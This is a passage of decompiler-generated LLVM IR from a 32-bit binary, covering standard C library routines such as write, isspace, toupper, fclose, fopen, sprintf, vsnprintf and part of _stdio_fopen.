  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050cec = load i32, i32* @ebx, align 4
  %v4_8050cf4 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8050cec, i32* @ebx, align 4
  store i32 %v4_8050cf4, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_8050cf4, -4095
  br i1 %tmp11, label %dec_label_pc_8050d0c, label %dec_label_pc_8050d00

dec_label_pc_8050d00:                             ; preds = %entry
  %v1_8050d00 = call i32 @__errno_location(i32 %v0_8050cec)
  %v0_8050d05 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050d05 = sub i32 0, %v0_8050d05
  %v2_8050d07 = inttoptr i32 %v1_8050d00 to i32*
  store i32 %v1_8050d05, i32* %v2_8050d07, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050d0c

dec_label_pc_8050d0c:                             ; preds = %entry, %dec_label_pc_8050d00
  %v0_8050d0c = phi i32 [ %v4_8050cf4, %entry ], [ -1, %dec_label_pc_8050d00 ]
  %v2_8050d0e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050d0e, i32* @edx, align 4
  %v2_8050d10 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050d10, i32* @edi, align 4
  ret i32 %v0_8050d0c

; uselistorder directives
  uselistorder i32 %v4_8050cf4, { 1, 0, 2 }
  uselistorder i32 %v0_8050cec, { 1, 0 }
  uselistorder label %dec_label_pc_8050d0c, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8050d18 = load i32, i32* inttoptr (i32 134591096 to i32*), align 8
  %v2_8050d1d = mul i32 %arg1, 2
  %v3_8050d1d = add i32 %v0_8050d18, %v2_8050d1d
  %v4_8050d1d = inttoptr i32 %v3_8050d1d to i16*
  %v5_8050d1d = load i16, i16* %v4_8050d1d, align 2
  %v6_8050d1d = zext i16 %v5_8050d1d to i32
  %v1_8050d21 = and i32 %v6_8050d1d, 32
  ret i32 %v1_8050d21
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8050d2c = add i32 %arg1, 128
  %v6_8050d37 = icmp ugt i32 %v1_8050d2c, 383
  br i1 %v6_8050d37, label %dec_label_pc_8050d42, label %dec_label_pc_8050d39

dec_label_pc_8050d39:                             ; preds = %entry
  %v0_8050d39 = load i32, i32* inttoptr (i32 134591104 to i32*), align 128
  %v2_8050d3e = mul i32 %arg1, 2
  %v3_8050d3e = add i32 %v0_8050d39, %v2_8050d3e
  %v4_8050d3e = inttoptr i32 %v3_8050d3e to i16*
  %v5_8050d3e = load i16, i16* %v4_8050d3e, align 2
  %v6_8050d3e = sext i16 %v5_8050d3e to i32
  store i32 %v6_8050d3e, i32* @edx, align 4
  br label %dec_label_pc_8050d42

dec_label_pc_8050d42:                             ; preds = %entry, %dec_label_pc_8050d39
  %v0_8050d42 = phi i32 [ %arg1, %entry ], [ %v6_8050d3e, %dec_label_pc_8050d39 ]
  ret i32 %v0_8050d42

; uselistorder directives
  uselistorder label %dec_label_pc_8050d42, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8061780.471 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8050d50 = load i32, i32* @ebp, align 4
  %v0_8050d51 = load i32, i32* @edi, align 4
  %v0_8050d52 = load i32, i32* @esi, align 4
  %v0_8050d53 = load i32, i32* @ebx, align 4
  %v4_8050d57 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8050d57, i32* @esi, align 4
  %v1_8050d5b = add i32 %v4_8050d57, 52
  %v2_8050d5b = inttoptr i32 %v1_8050d5b to i32*
  %v3_8050d5b = load i32, i32* %v2_8050d5b, align 4
  store i32 %v3_8050d5b, i32* @ebp, align 4
  %v1_8050d5e = icmp eq i32 %v3_8050d5b, 0
  %v1_8050d60 = icmp eq i1 %v1_8050d5e, false
  br i1 %v1_8050d60, label %dec_label_pc_8050d81, label %dec_label_pc_8050d62

dec_label_pc_8050d62:                             ; preds = %entry
  %v1_8050d62 = add i32 %v4_8050d57, 56
  store i32 %v1_8050d62, i32* @ebx, align 4
  %v2_8050d6c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050d6c, i32* @eax, align 4
  %v2_8050d71 = call i32 @__pthread_return_void(i32 %v2_8050d6c, i32 134563799)
  %v0_8050d76 = load i32, i32* @ebx, align 4
  %v1_8050d79 = call i32 @__pthread_return_0(i32 %v0_8050d76)
  store i32 %v1_8050d79, i32* @eax, align 4
  %v0_8050d83.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050d81

dec_label_pc_8050d81:                             ; preds = %entry, %dec_label_pc_8050d62
  %v0_8050d8b = phi i32 [ %v4_8050d57, %entry ], [ %v0_8050d83.pre, %dec_label_pc_8050d62 ]
  store i32 0, i32* @edi, align 4
  %v1_8050d83 = inttoptr i32 %v0_8050d8b to i8*
  %v2_8050d83 = load i8, i8* %v1_8050d83, align 1
  %v3_8050d83 = and i8 %v2_8050d83, 64
  %v4_8050d83 = icmp eq i8 %v3_8050d83, 0
  br i1 %v4_8050d83, label %dec_label_pc_8050d81.dec_label_pc_8050d96_crit_edge, label %dec_label_pc_8050d88

dec_label_pc_8050d81.dec_label_pc_8050d96_crit_edge: ; preds = %dec_label_pc_8050d81
  br label %dec_label_pc_8050d96

dec_label_pc_8050d88:                             ; preds = %dec_label_pc_8050d81
  %v1_8050d8c = inttoptr i32 %v0_8050d8b to i16*
  %v2_8050d8c = call i32 @fflush_unlocked(i16* %v1_8050d8c)
  store i32 %v2_8050d8c, i32* @edi, align 4
  %v0_8050d99.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050d96

dec_label_pc_8050d96:                             ; preds = %dec_label_pc_8050d81.dec_label_pc_8050d96_crit_edge, %dec_label_pc_8050d88
  %v0_8050d99 = phi i32 [ %v0_8050d8b, %dec_label_pc_8050d81.dec_label_pc_8050d96_crit_edge ], [ %v0_8050d99.pre, %dec_label_pc_8050d88 ]
  %v1_8050d99 = add i32 %v0_8050d99, 4
  %v2_8050d99 = inttoptr i32 %v1_8050d99 to i32*
  %v3_8050d99 = load i32, i32* %v2_8050d99, align 4
  %v1_8050d9c = call i32 @__libc_close(i32 %v3_8050d99)
  store i32 %v1_8050d9c, i32* @eax, align 4
  %v2_8050da4 = icmp slt i32 %v1_8050d9c, 0
  %v1_8050da6 = icmp eq i1 %v2_8050da4, false
  br i1 %v1_8050da6, label %dec_label_pc_8050dab, label %dec_label_pc_8050da8

dec_label_pc_8050da8:                             ; preds = %dec_label_pc_8050d96
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8050dab

dec_label_pc_8050dab:                             ; preds = %dec_label_pc_8050d96, %dec_label_pc_8050da8
  %v0_8050dab = load i32, i32* @esi, align 4
  %v1_8050dab = add i32 %v0_8050dab, 4
  %v2_8050dab = inttoptr i32 %v1_8050dab to i32*
  store i32 -1, i32* %v2_8050dab, align 4
  %v2_8050dbd = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8050dbd, i32* @ebx, align 4
  %v2_8050dc2 = call i32 @__pthread_return_void(i32 %v2_8050dbd, i32 134563799)
  %v1_8050dce = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2b4.472 to i32))
  %v0_8050dd3 = load i32, i32* @global_var_805f544.473, align 4
  %v1_8050dd8 = add i32 %v0_8050dd3, 1
  store i32 %v1_8050dd8, i32* @global_var_805f544.473, align 4
  store i32 ptrtoint (i32* @global_var_805b2b4.472 to i32), i32* @eax, align 4
  %v2_8050de3 = call i32 @__pthread_return_void(i32 %v2_8050dbd, i32 1)
  store i32 %v2_8050de3, i32* @eax, align 4
  %v0_8050deb = load i32, i32* @esi, align 4
  %v1_8050deb = inttoptr i32 %v0_8050deb to i16*
  %v2_8050deb = load i16, i16* %v1_8050deb, align 2
  %v3_8050deb = and i16 %v2_8050deb, 24576
  store i16 %v3_8050deb, i16* %v1_8050deb, align 2
  %v0_8050df0 = load i32, i32* @esi, align 4
  %v1_8050df0 = inttoptr i32 %v0_8050df0 to i16*
  %v2_8050df0 = load i16, i16* %v1_8050df0, align 2
  %v3_8050df0 = or i16 %v2_8050df0, 48
  store i16 %v3_8050df0, i16* %v1_8050df0, align 2
  br i1 %v1_8050d60, label %dec_label_pc_8050e09, label %dec_label_pc_8050df8

dec_label_pc_8050df8:                             ; preds = %dec_label_pc_8050dab
  %v2_8050dfc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050dfc, i32* @eax, align 4
  %v2_8050e01 = call i32 @__pthread_return_void(i32 %v2_8050dfc, i32 1)
  store i32 %v2_8050e01, i32* @eax, align 4
  br label %dec_label_pc_8050e09

dec_label_pc_8050e09:                             ; preds = %dec_label_pc_8050dab, %dec_label_pc_8050df8
  %v0_8050e09 = load i32, i32* @esi, align 4
  %v1_8050e09 = add i32 %v0_8050e09, 1
  %v2_8050e09 = inttoptr i32 %v1_8050e09 to i8*
  %v3_8050e09 = load i8, i8* %v2_8050e09, align 1
  %v4_8050e09 = and i8 %v3_8050e09, 64
  %v5_8050e09 = icmp eq i8 %v4_8050e09, 0
  br i1 %v5_8050e09, label %dec_label_pc_8050e1d, label %dec_label_pc_8050e0f

dec_label_pc_8050e0f:                             ; preds = %dec_label_pc_8050e09
  %v1_8050e12 = add i32 %v0_8050e09, 8
  %v2_8050e12 = inttoptr i32 %v1_8050e12 to i32*
  %v3_8050e12 = load i32, i32* %v2_8050e12, align 4
  %v1_8050e15 = call i32 @free(i32 %v3_8050e12)
  store i32 %v1_8050e15, i32* @eax, align 4
  br label %dec_label_pc_8050e1d

dec_label_pc_8050e1d:                             ; preds = %dec_label_pc_8050e09, %dec_label_pc_8050e0f
  %v2_8050e29 = call i32 @__pthread_return_void(i32 %v2_8050dbd, i32 134563799)
  %v1_8050e35 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2b4.472 to i32))
  store i32 ptrtoint (i32* @global_var_805b2b4.472 to i32), i32* @eax, align 4
  %v0_8050e3c = load i32, i32* @global_var_805f548.474, align 8
  %v1_8050e3c = add i32 %v0_8050e3c, 1
  store i32 %v1_8050e3c, i32* @global_var_805f548.474, align 8
  %v2_8050e45 = call i32 @__pthread_return_void(i32 %v2_8050dbd, i32 1)
  %v0_8050e4a = call i32 @_stdio_openlist_dec_use()
  %v0_8050e52 = load i32, i32* @edi, align 4
  store i32 %v0_8050d53, i32* @ebx, align 4
  store i32 %v0_8050d52, i32* @esi, align 4
  store i32 %v0_8050d51, i32* @edi, align 4
  store i32 %v0_8050d50, i32* @ebp, align 4
  ret i32 %v0_8050e52

; uselistorder directives
  uselistorder label %dec_label_pc_8050e1d, { 1, 0 }
  uselistorder label %dec_label_pc_8050e09, { 1, 0 }
  uselistorder label %dec_label_pc_8050dab, { 1, 0 }
  uselistorder label %dec_label_pc_8050d96, { 1, 0 }
  uselistorder label %dec_label_pc_8050d81, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8050e6b = inttoptr i32 %arg2 to i8*
  %v5_8050e6b = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_8050e6b, i32 0, i32 -1)
  ret i32 %v5_8050e6b
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_8050e77 = ptrtoint i32* %stack_var_12 to i32
  %v4_8050e8a = inttoptr i32 %arg1 to i8*
  %v5_8050e8a = call i32 @__GI_vsnprintf(i8* %v4_8050e8a, i32 -1, i32 %arg2, i32 %v2_8050e77)
  ret i32 %v5_8050e8a
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050e94 = load i32, i32* @ebp, align 4
  %v0_8050e95 = load i32, i32* @edi, align 4
  %v0_8050e96 = load i32, i32* @esi, align 4
  %v0_8050e97 = load i32, i32* @ebx, align 4
  store i32 %v0_8050e97, i32* %stack_var_-16, align 4
  %v4_8050e9b = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050e9b, i32* @esi, align 4
  %v2_8050e9f = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_8050ed0 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_8050ed0, i32* @ebp, align 4
  %v1_8050ed4 = sub i32 -1, %v4_8050e9b
  store i32 %v1_8050ed4, i32* @ebx, align 4
  %v1_8050ed7 = call i32 @__stdio_init_mutex(i32 %v2_8050e9f)
  %v0_8050ee7 = load i32, i32* @ebx, align 4
  %v1_8050ee7 = load i32, i32* @edi, align 4
  %tmp30 = icmp ugt i32 %v0_8050ee7, %v1_8050ee7
  br i1 %tmp30, label %dec_label_pc_8050eeb, label %dec_label_pc_8050eed

dec_label_pc_8050eeb:                             ; preds = %entry
  store i32 %v1_8050ee7, i32* @ebx, align 4
  br label %dec_label_pc_8050eed

dec_label_pc_8050eed:                             ; preds = %entry, %dec_label_pc_8050eeb
  %v1_8050eed = phi i32 [ %v0_8050ee7, %entry ], [ %v1_8050ee7, %dec_label_pc_8050eeb ]
  %v0_8050eed = load i32, i32* @esi, align 4
  %v2_8050eed = add i32 %v0_8050eed, %v1_8050eed
  %v4_8050f18 = inttoptr i32 %arg3 to i8*
  %v5_8050f18 = call i32 @_vfprintf_internal(i32 %v2_8050ed0, i8* %v4_8050f18, i32 %arg4, i32 %v2_8050eed)
  store i32 %v5_8050f18, i32* @edx, align 4
  %v0_8050f22 = load i32, i32* @ebx, align 4
  %v1_8050f22 = icmp eq i32 %v0_8050f22, 0
  br i1 %v1_8050f22, label %dec_label_pc_8050f3c, label %dec_label_pc_8050f26

dec_label_pc_8050f26:                             ; preds = %dec_label_pc_8050eed
  %v16_8050f2a = icmp eq i32 %v1_8050eed, 0
  %v1_8050f2e = icmp eq i1 %v16_8050f2a, false
  br i1 %v1_8050f2e, label %dec_label_pc_8050f35, label %dec_label_pc_8050f30

dec_label_pc_8050f30:                             ; preds = %dec_label_pc_8050f26
  %v1_8050f30 = add i32 %v2_8050eed, -1
  br label %dec_label_pc_8050f35

dec_label_pc_8050f35:                             ; preds = %dec_label_pc_8050f26, %dec_label_pc_8050f30
  %stack_var_-80.0.in = phi i32 [ %v0_8050eed, %dec_label_pc_8050f26 ], [ %v1_8050f30, %dec_label_pc_8050f30 ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_8050f3f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050f3c

dec_label_pc_8050f3c:                             ; preds = %dec_label_pc_8050eed, %dec_label_pc_8050f35
  %v0_8050f3f = phi i32 [ %v5_8050f18, %dec_label_pc_8050eed ], [ %v0_8050f3f.pre, %dec_label_pc_8050f35 ]
  %v2_8050f41 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050f41, i32* @ebx, align 4
  store i32 %v0_8050e96, i32* @esi, align 4
  store i32 %v0_8050e95, i32* @edi, align 4
  store i32 %v0_8050e94, i32* @ebp, align 4
  ret i32 %v0_8050f3f

; uselistorder directives
  uselistorder i32 %v0_8050eed, { 1, 0 }
  uselistorder i32 %v1_8050eed, { 1, 0 }
  uselistorder i32 %v1_8050ee7, { 1, 2, 0 }
  uselistorder i32 %v0_8050ee7, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_8050f3c, { 1, 0 }
  uselistorder label %dec_label_pc_8050f35, { 1, 0 }
  uselistorder label %dec_label_pc_8050eed, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050f48 = load i32, i32* @ebp, align 4
  %v0_8050f49 = load i32, i32* @edi, align 4
  %v0_8050f4a = load i32, i32* @esi, align 4
  %v0_8050f4b = load i32, i32* @ebx, align 4
  store i32 %v0_8050f4b, i32* %stack_var_-16, align 4
  %v4_8050f4f = ptrtoint i8* %arg2 to i32
  store i32 %v4_8050f4f, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_8050f5f = load i8, i8* %arg2, align 1
  %v3_8050f5f = zext i8 %v2_8050f5f to i32
  %v4_8050f5f = load i32, i32* @eax, align 4
  %v5_8050f5f = and i32 %v4_8050f5f, -256
  %v6_8050f5f = or i32 %v5_8050f5f, %v3_8050f5f
  store i32 %v6_8050f5f, i32* %eax.global-to-local, align 4
  %v10_8050f61 = icmp eq i8 %v2_8050f5f, 114
  br i1 %v10_8050f61, label %dec_label_pc_8050fa3, label %dec_label_pc_8050f65

dec_label_pc_8050f65:                             ; preds = %entry
  store i32 577, i32* @ebx, align 4
  %v10_8050f6a = icmp eq i8 %v2_8050f5f, 119
  br i1 %v10_8050f6a, label %dec_label_pc_8050fa5, label %dec_label_pc_8050f6e

dec_label_pc_8050f6e:                             ; preds = %dec_label_pc_8050f65
  store i32 1089, i32* @ebx, align 4
  %v10_8050f72 = icmp eq i8 %v2_8050f5f, 97
  br i1 %v10_8050f72, label %dec_label_pc_8050fa5, label %dec_label_pc_8050f76

dec_label_pc_8050f76:                             ; preds = %dec_label_pc_805101e, %dec_label_pc_8050ff8, %dec_label_pc_8050f6e
  %v0_8050f76 = load i32, i32* %stack_var_-16, align 4
  %v1_8050f76 = call i32 @__errno_location(i32 %v0_8050f76)
  store i32 %v1_8050f76, i32* %eax.global-to-local, align 4
  %v0_8050f7b = load i32, i32* @ebp, align 4
  %v1_8050f7b = icmp eq i32 %v0_8050f7b, 0
  %v1_8050f7d = inttoptr i32 %v1_8050f76 to i32*
  store i32 22, i32* %v1_8050f7d, align 4
  br i1 %v1_8050f7b, label %dec_label_pc_805116b, label %dec_label_pc_8050f89

dec_label_pc_8050f89:                             ; preds = %dec_label_pc_8051047, %dec_label_pc_8050f76
  %v0_8050f89 = load i32, i32* @ebp, align 4
  %v1_8050f89 = add i32 %v0_8050f89, 1
  %v2_8050f89 = inttoptr i32 %v1_8050f89 to i8*
  %v3_8050f89 = load i8, i8* %v2_8050f89, align 1
  %v4_8050f89 = and i8 %v3_8050f89, 32
  %v5_8050f89 = icmp eq i8 %v4_8050f89, 0
  br i1 %v5_8050f89, label %dec_label_pc_805116b, label %dec_label_pc_8050f93

dec_label_pc_8050f93:                             ; preds = %dec_label_pc_8050f89
  store i32 %v0_8050f89, i32* %stack_var_-76, align 4
  %v1_8050f97 = call i32 @free(i32 %v0_8050f89)
  store i32 %v1_8050f97, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8051166

dec_label_pc_8050fa3:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8050fa5

dec_label_pc_8050fa5:                             ; preds = %dec_label_pc_8050f6e, %dec_label_pc_8050f65, %dec_label_pc_8050fa3
  %v0_8050fb6 = phi i32 [ 1089, %dec_label_pc_8050f6e ], [ 577, %dec_label_pc_8050f65 ], [ 1, %dec_label_pc_8050fa3 ]
  %v1_8050fa5 = add i32 %v4_8050f4f, 1
  store i32 %v1_8050fa5, i32* %eax.global-to-local, align 4
  %v2_8050fa8 = inttoptr i32 %v1_8050fa5 to i8*
  %v3_8050fa8 = load i8, i8* %v2_8050fa8, align 1
  %v12_8050fa8 = icmp eq i8 %v3_8050fa8, 98
  br i1 %v12_8050fa8, label %dec_label_pc_8050fb0, label %dec_label_pc_8050fae

dec_label_pc_8050fae:                             ; preds = %dec_label_pc_8050fa5
  store i32 %v4_8050f4f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050fb0

dec_label_pc_8050fb0:                             ; preds = %dec_label_pc_8050fa5, %dec_label_pc_8050fae
  %v0_8050fb0 = phi i32 [ %v1_8050fa5, %dec_label_pc_8050fa5 ], [ %v4_8050f4f, %dec_label_pc_8050fae ]
  %v1_8050fb0 = add i32 %v0_8050fb0, 1
  %v2_8050fb0 = inttoptr i32 %v1_8050fb0 to i8*
  %v3_8050fb0 = load i8, i8* %v2_8050fb0, align 1
  %v12_8050fb0 = icmp eq i8 %v3_8050fb0, 43
  %v1_8050fb4 = icmp eq i1 %v12_8050fb0, false
  br i1 %v1_8050fb4, label %dec_label_pc_8050fbe, label %dec_label_pc_8050fb6

dec_label_pc_8050fb6:                             ; preds = %dec_label_pc_8050fb0
  store i32 %v0_8050fb6, i32* %eax.global-to-local, align 4
  %v1_8050fbb = add nuw nsw i32 %v0_8050fb6, 1
  store i32 %v1_8050fbb, i32* @ebx, align 4
  br label %dec_label_pc_8050fbe

dec_label_pc_8050fbe:                             ; preds = %dec_label_pc_8050fb0, %dec_label_pc_8050fb6
  %v1_8050fbe = icmp eq i32 %arg3, 0
  %v1_8050fc0 = icmp eq i1 %v1_8050fbe, false
  br i1 %v1_8050fc0, label %dec_label_pc_8050ff4, label %dec_label_pc_8050fc2

dec_label_pc_8050fc2:                             ; preds = %dec_label_pc_8050fbe
  store i32 80, i32* %stack_var_-76, align 4
  %v1_8050fc7 = call i32 @malloc(i32 80)
  store i32 %v1_8050fc7, i32* %eax.global-to-local, align 4
  store i32 %v1_8050fc7, i32* @ebp, align 4
  %v2_8050fd1 = icmp eq i32 %v1_8050fc7, 0
  br i1 %v2_8050fd1, label %dec_label_pc_805116d, label %dec_label_pc_8050fd9

dec_label_pc_8050fd9:                             ; preds = %dec_label_pc_8050fc2
  %v2_8050fc7 = inttoptr i32 %v1_8050fc7 to i16*
  store i16 8192, i16* %v2_8050fc7, align 2
  %v2_8050fe1 = add i32 %v1_8050fc7, 8
  %v3_8050fe1 = inttoptr i32 %v2_8050fe1 to i32*
  store i32 0, i32* %v3_8050fe1, align 4
  %v2_8050fe8 = add i32 %v1_8050fc7, 56
  store i32 %v2_8050fe8, i32* %eax.global-to-local, align 4
  store i32 %v2_8050fe8, i32* %stack_var_-76, align 4
  %v1_8050fec = call i32 @__stdio_init_mutex(i32 %v2_8050fe8)
  store i32 %v1_8050fec, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050ff4

dec_label_pc_8050ff4:                             ; preds = %dec_label_pc_8050fbe, %dec_label_pc_8050fd9
  %v2_8050ff4 = icmp slt i32 %arg4, 0
  br i1 %v2_8050ff4, label %dec_label_pc_8051041, label %dec_label_pc_8050ff8

dec_label_pc_8050ff8:                             ; preds = %dec_label_pc_8050ff4
  %v0_8050ff8 = load i32, i32* @ebx, align 4
  %v0_8050ffa = load i32, i32* @esi, align 4
  %v1_8050ffa = add i32 %v0_8050ffa, 1
  store i32 %v1_8050ffa, i32* %eax.global-to-local, align 4
  %v1_8050ffd = and i32 %v0_8050ff8, 32771
  store i32 %v1_8050ffd, i32* %edx.global-to-local, align 4
  %v1_8051003 = load i32, i32* @ebp, align 4
  %v2_8051003 = add i32 %v1_8051003, 4
  %v3_8051003 = inttoptr i32 %v2_8051003 to i32*
  store i32 %arg4, i32* %v3_8051003, align 4
  %v0_8051006 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051006 = add i32 %v0_8051006, 1
  store i32 %v1_8051006, i32* @edx, align 4
  %v0_8051007 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051007 = and i32 %v0_8051007, %v1_8051006
  store i32 %v2_8051007, i32* %eax.global-to-local, align 4
  %v12_8051009 = icmp eq i32 %v2_8051007, %v1_8051006
  %v1_805100b = icmp eq i1 %v12_8051009, false
  br i1 %v1_805100b, label %dec_label_pc_8050f76, label %dec_label_pc_8051011

dec_label_pc_8051011:                             ; preds = %dec_label_pc_8050ff8
  %v0_8051011 = load i32, i32* @esi, align 4
  %v1_8051013 = and i32 %v0_8051011, 1024
  %v1_8051015 = xor i32 %v1_8051013, 1024
  store i32 %v1_8051015, i32* %eax.global-to-local, align 4
  %v1_805101a = load i32, i32* @ebx, align 4
  %v2_805101a = and i32 %v1_805101a, %v1_8051015
  %v3_805101a = icmp eq i32 %v2_805101a, 0
  br i1 %v3_805101a, label %dec_label_pc_8051011.dec_label_pc_8051037_crit_edge, label %dec_label_pc_805101e

dec_label_pc_8051011.dec_label_pc_8051037_crit_edge: ; preds = %dec_label_pc_8051011
  br label %dec_label_pc_8051037

dec_label_pc_805101e:                             ; preds = %dec_label_pc_8051011
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_8051027 = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_8051027, i32* %eax.global-to-local, align 4
  %v1_805102f = icmp eq i32 %v3_8051027, 0
  %v1_8051031 = icmp eq i1 %v1_805102f, false
  br i1 %v1_8051031, label %dec_label_pc_8050f76, label %dec_label_pc_805101e.dec_label_pc_8051037_crit_edge

dec_label_pc_805101e.dec_label_pc_8051037_crit_edge: ; preds = %dec_label_pc_805101e
  %v0_8051037.pre = load i32, i32* @esi, align 4
  %v0_805103d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051037

dec_label_pc_8051037:                             ; preds = %dec_label_pc_8051011.dec_label_pc_8051037_crit_edge, %dec_label_pc_805101e.dec_label_pc_8051037_crit_edge
  %v0_805103d = phi i32 [ %v1_805101a, %dec_label_pc_8051011.dec_label_pc_8051037_crit_edge ], [ %v0_805103d.pre, %dec_label_pc_805101e.dec_label_pc_8051037_crit_edge ]
  %v0_8051037 = phi i32 [ %v0_8051011, %dec_label_pc_8051011.dec_label_pc_8051037_crit_edge ], [ %v0_8051037.pre, %dec_label_pc_805101e.dec_label_pc_8051037_crit_edge ]
  %v1_8051037 = and i32 %v0_8051037, 32768
  %v2_805103d = or i32 %v1_8051037, %v0_805103d
  store i32 %v2_805103d, i32* @ebx, align 4
  br label %dec_label_pc_8051062

dec_label_pc_8051041:                             ; preds = %dec_label_pc_8050ff4
  %v1_8051041 = add i32 %arg4, 1
  %v8_8051041 = icmp eq i32 %v1_8051041, 0
  store i32 %v1_8051041, i32* @edi, align 4
  %v0_805104d.pre = load i32, i32* @ebx, align 4
  br i1 %v8_8051041, label %dec_label_pc_8051047, label %dec_label_pc_8051044

dec_label_pc_8051044:                             ; preds = %dec_label_pc_8051041
  %v11_8051044 = or i32 %v0_805104d.pre, 32768
  store i32 %v11_8051044, i32* @ebx, align 4
  br label %dec_label_pc_8051047

dec_label_pc_8051047:                             ; preds = %dec_label_pc_8051041, %dec_label_pc_8051044
  %v0_805104d = phi i32 [ %v11_8051044, %dec_label_pc_8051044 ], [ %v0_805104d.pre, %dec_label_pc_8051041 ]
  %v0_805104e = load i32, i32* @esi, align 4
  store i32 %v0_805104e, i32* %stack_var_-76, align 4
  %v3_805104f = inttoptr i32 %v0_805104e to i8*
  %v4_805104f = call i32 @__libc_open(i8* %v3_805104f, i32 %v0_805104d)
  store i32 %v4_805104f, i32* %eax.global-to-local, align 4
  %v1_8051057 = load i32, i32* @ebp, align 4
  %v2_8051057 = add i32 %v1_8051057, 4
  %v3_8051057 = inttoptr i32 %v2_8051057 to i32*
  store i32 %v4_805104f, i32* %v3_8051057, align 4
  %v2_805105a = icmp slt i32 %v4_805104f, 0
  br i1 %v2_805105a, label %dec_label_pc_8050f89, label %dec_label_pc_8051062

dec_label_pc_8051062:                             ; preds = %dec_label_pc_8051047, %dec_label_pc_8051037
  %v0_8051062 = load i32, i32* @ebp, align 4
  %v1_8051062 = inttoptr i32 %v0_8051062 to i16*
  %v2_8051062 = load i16, i16* %v1_8051062, align 2
  %v3_8051062 = and i16 %v2_8051062, 8192
  store i16 %v3_8051062, i16* %v1_8051062, align 2
  %v0_8051068 = load i32, i32* @ebx, align 4
  %v8_805106a = and i32 %v0_8051068, -31744
  %v1_805106f = urem i32 %v0_8051068, 4
  %v1_8051072 = add nuw nsw i32 %v1_805106f, 1
  store i32 %v1_8051072, i32* %eax.global-to-local, align 4
  %v1_8051073 = load i32, i32* @ebp, align 4
  %v2_8051073 = inttoptr i32 %v1_8051073 to i32*
  %v3_8051073 = load i32, i32* %v2_8051073, align 4
  %v4_8051073 = or i32 %v3_8051073, %v8_805106a
  %v1_8051076 = mul nuw nsw i32 %v1_8051072, 16
  %v2_8051079 = xor i32 %v1_8051076, 48
  store i32 %v2_8051079, i32* %eax.global-to-local, align 4
  %v2_805107c = or i32 %v4_8051073, %v2_8051079
  store i32 %v2_805107c, i32* @ebx, align 4
  %v1_805107e = trunc i32 %v2_805107c to i16
  %v3_805107e = inttoptr i32 %v1_8051073 to i16*
  store i16 %v1_805107e, i16* %v3_805107e, align 2
  %v0_8051082 = load i32, i32* %stack_var_-76, align 4
  %v1_8051082 = call i32 @__errno_location(i32 %v0_8051082)
  store i32 %v1_8051082, i32* %eax.global-to-local, align 4
  store i32 %v1_8051082, i32* @esi, align 4
  %v1_805108c = inttoptr i32 %v1_8051082 to i32*
  %v2_805108c = load i32, i32* %v1_805108c, align 4
  store i32 %v2_805108c, i32* @edi, align 4
